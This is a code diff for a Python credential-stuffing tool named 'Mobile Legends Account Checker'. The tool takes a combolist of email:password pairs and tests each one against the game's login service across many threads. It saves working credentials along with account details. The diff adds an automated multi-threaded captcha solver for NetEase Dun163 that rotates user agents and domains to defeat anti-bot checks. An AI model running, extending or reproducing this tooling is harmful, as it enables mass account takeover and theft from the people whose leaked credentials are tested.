@@ -2,6 +2,7 @@ import hashlib
 import json
 import time
 import threading
+import random
 from concurrent.futures import ThreadPoolExecutor
 import os
 import sys
@@ -10,7 +11,6 @@ from tqdm import tqdm
 from colorama import init, Fore, Style
 import logging
 from curl_cffi import requests
-from solver import start_solver, get_cn31_token
 
 init(autoreset=True)
 
@@ -28,6 +28,81 @@ banned_count = 0
 total_accounts = 0
 start_time = None
 _result_queue = queue.Queue()
+
+_token_queue = queue.Queue(maxsize=200)
+_solver_running = False
+_solver_threads = []
+_solver_init_lock = threading.Lock()
+
+def start_solver(num_threads=10):
+    global _solver_running, _solver_threads
+    with _solver_init_lock:
+        if _solver_running:
+            return True
+        try:
+            from solver import initialize_global_model, get_compiled_js, Dun163, DUN163_DOMAINS, ID, REFERER, FP_H
+            from fake_useragent import UserAgent
+            if not initialize_global_model():
+                return False
+            if not get_compiled_js('dun163.js'):
+                return False
+            _solver_running = True
+            def _worker(thread_id, config):
+                d = None
+                cycle = 0
+                while _solver_running:
+                    try:
+                        if d is None or cycle >= 3:
+                            d = None
+                            config['UA'] = UserAgent().random
+                            config['DOMAIN'] = random.choice(DUN163_DOMAINS)
+                            d = Dun163(
+                                id_=config['ID_'],
+                                referer=config['REFERER'],
+                                fp_h=config['FP_H'],
+                                ua=config['UA'],
+                                thread_id=thread_id,
+                                domain=config['DOMAIN']
+                            )
+                            cycle = 0
+                        success = d.run()
+                        cycle += 1
+                        if success and d.resp_json2:
+                            validate_raw = d.resp_json2.get('validate', '')
+                            validate_decoded = ""
+                            if validate_raw and d.ctx:
+                                try:
+                                    validate_decoded = d.ctx.call('do_onVerify', validate_raw, d.fp)
+                                except:
+                                    validate_decoded = validate_raw
+                            if validate_decoded and len(validate_decoded.strip()) > 10:
+                                try:
+                                    _token_queue.put(validate_decoded.strip(), timeout=5)
+                                except queue.Full:
+                                    pass
+                            if success:
+                                cycle = 3
+                    except Exception:
+                        d = None
+                        continue
+            _solver_threads = []
+            for i in range(num_threads):
+                config = {
+                    'ID_': ID,
+                    'REFERER': REFERER,
+                    'FP_H': FP_H,
+                    'UA': UserAgent().random,
+                    'DOMAIN': DUN163_DOMAINS[i % len(DUN163_DOMAINS)]
+                }
+                t = threading.Thread(target=_worker, args=(i + 1, config), daemon=False)
+                t.start()
+                _solver_threads.append(t)
+            return True
+        except Exception:
+            return False
+
+def get_cn31_token(timeout=None):
+    return _token_queue.get(timeout=timeout)
 
 def generate_sign(username, md5pwd, cn31):
     params_str = f"account={username}&country=&e_captcha={cn31}&game_token=&md5pwd={md5pwd}&recaptcha_token="
@@ -378,9 +453,9 @@ def check_account(email, password):
 
                         if ban_status["is_banned"]:
                             with file_lock:
-                                banned_count += 1
-                            _result_queue.put(f"{Fore.YELLOW}[BANNED] - {email} - {account_info['nn']}{Style.RESET_ALL}")
-                            save_banned_account(email, password, account_info, ban_status)
+                                invalid_count += 1
+                            _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
+                            save_invalid_account(email, password)
                         else:
                             with file_lock:
                                 valid_count += 1
@@ -388,22 +463,22 @@ def check_account(email, password):
                             save_valid_account(email, password, account_info)
                         return
                     else:
-                        save_failed_account(email, password, "Failed to get account info")
                         with file_lock:
                             invalid_count += 1
-                        _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Info unavailable{Style.RESET_ALL}")
+                        _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
+                        save_invalid_account(email, password)
                         return
                 else:
-                    save_failed_account(email, password, "Failed to get JWT token")
                     with file_lock:
                         invalid_count += 1
-                    _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Token unavailable{Style.RESET_ALL}")
+                    _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
+                    save_invalid_account(email, password)
                     return
             else:
-                save_failed_account(email, password, "No GUID or session in response")
                 with file_lock:
                     invalid_count += 1
-                _result_queue.put(f"{Fore.CYAN}[FAILED] - {email} - Session unavailable{Style.RESET_ALL}")
+                _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
+                save_invalid_account(email, password)
                 return
         else:
             with file_lock:
@@ -415,7 +490,7 @@ def check_account(email, password):
     except Exception as e:
         with file_lock:
             invalid_count += 1
-        _result_queue.put(f"{Fore.RED}[ERROR] - {email} - {str(e)[:100]}{Style.RESET_ALL}")
+        _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
         save_invalid_account(email, password)
 
 def worker_wrapper(email, password):
@@ -427,7 +502,7 @@ def worker_wrapper(email, password):
         with file_lock:
             global invalid_count
             invalid_count += 1
-        _result_queue.put(f"{Fore.RED}[WORKER ERROR] - {email} - {str(e)}{Style.RESET_ALL}")
+        _result_queue.put(f"{Fore.RED}[INVALID] - {email}{Style.RESET_ALL}")
         save_invalid_account(email, password)
     finally:
         with file_lock:
@@ -437,9 +512,8 @@ def worker_wrapper(email, password):
 def print_header():
     print(f"{Fore.CYAN}{Style.BRIGHT}")
     print("=" * 80)
-    print("🎮 MOBILE LEGENDS ACCOUNT CHECKER v2.0")
-    print("💻 Enhanced with Real-time Progress Tracking")
-    print("👨‍💻 Coded by @Shennxs")
+    print("MOBILE LEGENDS ACCOUNT CHECKER v2.0")
+    print("Coded by @Shennxs")
     print("=" * 80)
     print(f"{Style.RESET_ALL}")
 
@@ -454,61 +528,64 @@ def main():
 
     # Get input file
     while True:
-        file_path = input(f"{Fore.YELLOW}📁 Enter path to your accounts file (e.g., combolist.txt): {Style.RESET_ALL}").strip()
+        file_path = input(f"{Fore.YELLOW}Enter path to your accounts file (e.g., combolist.txt): {Style.RESET_ALL}").strip()
         if os.path.exists(file_path):
             break
         else:
-            print(f"{Fore.RED}❌ File '{file_path}' not found. Please enter a valid file path.{Style.RESET_ALL}")
+            print(f"{Fore.RED}File '{file_path}' not found. Please enter a valid file path.{Style.RESET_ALL}")
 
     # Load accounts
     with open(file_path, "r", encoding='utf-8') as f:
         lines = f.read().splitlines()
 
     accounts = []
+    seen = set()
     for line in lines:
         if ':' in line and line.strip():
             email, password = line.split(':', 1)
-            accounts.append((email.strip(), password.strip()))
+            pair = (email.strip(), password.strip())
+            if pair not in seen:
+                seen.add(pair)
+                accounts.append(pair)
 
     total_accounts = len(accounts)
     if total_accounts == 0:
-        print(f"{Fore.RED}❌ No valid accounts found in the file{Style.RESET_ALL}")
+        print(f"{Fore.RED}No valid accounts found in the file{Style.RESET_ALL}")
         return
 
-    print(f"{Fore.GREEN}📋 Found {total_accounts} accounts to check{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}Found {total_accounts} accounts to check{Style.RESET_ALL}")
 
     # Get solver thread count
     default_solver_threads = min(10, total_accounts)
     while True:
         try:
-            solver_threads = int(input(f"{Fore.YELLOW}🔧 Enter number of solver threads (default: {default_solver_threads}): {Style.RESET_ALL}") or str(default_solver_threads))
+            solver_threads = int(input(f"{Fore.YELLOW}Enter number of solver threads (default: {default_solver_threads}): {Style.RESET_ALL}") or str(default_solver_threads))
             if 1 <= solver_threads <= 200:
                 break
             else:
-                print(f"{Fore.RED}⚠️  Please enter a number between 1 and 200{Style.RESET_ALL}")
+                print(f"{Fore.RED}Please enter a number between 1 and 200{Style.RESET_ALL}")
         except ValueError:
-            print(f"{Fore.RED}⚠️  Please enter a valid number{Style.RESET_ALL}")
+            print(f"{Fore.RED}Please enter a valid number{Style.RESET_ALL}")
 
-    print(f"\n{Fore.CYAN}🚀 Initializing solver with {solver_threads} threads...{Style.RESET_ALL}")
+    print(f"\n{Fore.CYAN}Initializing solver with {solver_threads} threads...{Style.RESET_ALL}")
     if not start_solver(solver_threads):
-        print(f"{Fore.RED}❌ Failed to initialize solver{Style.RESET_ALL}")
+        print(f"{Fore.RED}Failed to initialize solver{Style.RESET_ALL}")
         return
-    print(f"{Fore.GREEN}✅ Solver initialized{Style.RESET_ALL}")
+    print(f"{Fore.GREEN}Solver initialized{Style.RESET_ALL}")
 
     # Get checker thread count
     recommended_threads = min(50, total_accounts, os.cpu_count() * 4)
     while True:
         try:
-            max_workers = int(input(f"{Fore.YELLOW}🔧 Enter number of checker threads (1-{min(800, total_accounts)}, recommended: {recommended_threads}): {Style.RESET_ALL}"))
+            max_workers = int(input(f"{Fore.YELLOW}Enter number of checker threads (1-{min(800, total_accounts)}, recommended: {recommended_threads}): {Style.RESET_ALL}"))
             if 1 <= max_workers <= min(800, total_accounts):
                 break
             else:
-                print(f"{Fore.RED}⚠️  Please enter a number between 1 and {min(800, total_accounts)}{Style.RESET_ALL}")
+                print(f"{Fore.RED}Please enter a number between 1 and {min(800, total_accounts)}{Style.RESET_ALL}")
         except ValueError:
-            print(f"{Fore.RED}⚠️  Please enter a valid number{Style.RESET_ALL}")
+            print(f"{Fore.RED}Please enter a valid number{Style.RESET_ALL}")
 
-    print(f"\n{Fore.CYAN}🚀 Starting account validation with {max_workers} checker threads + {solver_threads} solver threads...{Style.RESET_ALL}", flush=True)
-    print(f"{Fore.CYAN}📊 Progress will be shown in the progress bar below{Style.RESET_ALL}", flush=True)
+    print(f"\n{Fore.CYAN}Starting account validation with {max_workers} checker threads + {solver_threads} solver threads...{Style.RESET_ALL}", flush=True)
     print("-" * 80, flush=True)
 
     start_time = time.time()
@@ -518,9 +595,9 @@ def main():
         try:
             pbar = tqdm(
                 total=total_accounts,
-                desc="🔍 Initializing...",
+                desc="Initializing...",
                 unit="acc",
-                ncols=120,
+                ncols=100,
                 dynamic_ncols=False,
                 bar_format="{l_bar}{bar}| {postfix}",
                 colour='green',
@@ -531,7 +608,7 @@ def main():
                 maxinterval=1.0
             )
         except Exception as e:
-            print(f"\n⚠️  Progress bar unavailable ({e})", flush=True)
+            print(f"\nProgress bar unavailable ({e})", flush=True)
             pbar = None
 
         done_count = 0
@@ -543,12 +620,34 @@ def main():
 
             while done_count < len(accounts):
                 try:
+                    msgs = []
+                    updates = 0
                     msg = _result_queue.get(timeout=60)
                     if msg == "__UPDATE_BAR__":
-                        done_count += 1
-                        update_progress_bar(pbar)
+                        updates += 1
                     else:
-                        tqdm.write(msg)
+                        msgs.append(msg)
+                    while True:
+                        try:
+                            msg2 = _result_queue.get_nowait()
+                            if msg2 == "__UPDATE_BAR__":
+                                updates += 1
+                            else:
+                                msgs.append(msg2)
+                        except queue.Empty:
+                            break
+                    done_count += updates
+                    update_progress_bar(pbar)
+                    if msgs and pbar is not None:
+                        pbar.clear()
+                        for m in msgs:
+                            print(m, flush=True)
+                        pbar.refresh()
+                    elif msgs:
+                        for m in msgs:
+                            print(m, flush=True)
+                    elif pbar is not None:
+                        pbar.refresh()
                 except queue.Empty:
                     pass
         except KeyboardInterrupt:
@@ -560,7 +659,7 @@ def main():
                     pbar.close()
                 except Exception:
                     pass
-                print(f"{Fore.YELLOW}⏹️  STOPPED BY USER{Style.RESET_ALL}", flush=True)
+                print(f"{Fore.YELLOW}STOPPED BY USER{Style.RESET_ALL}", flush=True)
                 os._exit(0)
     except Exception as e:
         print(f"\n[MAIN LOOP CRASH] {e}", flush=True)
